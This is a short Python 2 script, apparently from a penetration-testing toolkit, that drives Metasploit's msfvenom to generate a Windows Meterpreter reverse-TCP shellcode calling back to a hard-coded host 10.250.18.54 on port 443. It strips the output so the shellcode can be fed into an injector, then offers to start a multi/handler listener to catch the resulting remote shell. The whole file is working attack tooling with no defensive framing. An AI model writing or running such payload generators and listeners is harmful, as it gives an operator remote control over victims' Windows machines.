# quick script that generates the proper format for the shellcode to feed into pyinjector
# generates powershell payload
import subprocess,re
def generate_powershell_shellcode(payload,ipaddr,port):
    # grab the metasploit path
    msf_path = "/opt/metasploit/msf3/"
    # generate payload
    proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s c" % (msf_path,payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
    data = proc.communicate()[0]
    # start to format this a bit to get it ready
    data = data.replace(";", "")
    data = data.replace(" ", "")
    data = data.replace("+", "")
    data = data.replace('"', "")
    data = data.replace("\n", "")
    data = data.replace("buf=", "")
    data = data.rstrip()
    # base counter
    print data

generate_powershell_shellcode("windows/meterpreter/reverse_tcp", "10.250.18.54", "443")

choice = raw_input("start listener? [y/n]: ")

if choice == "y":
        subprocess.Popen("msfcli multi/handler payload=windows/meterpreter/reverse_tcp LPORT=443 LHOST=10.250.18.54 E", shell=True).wait()
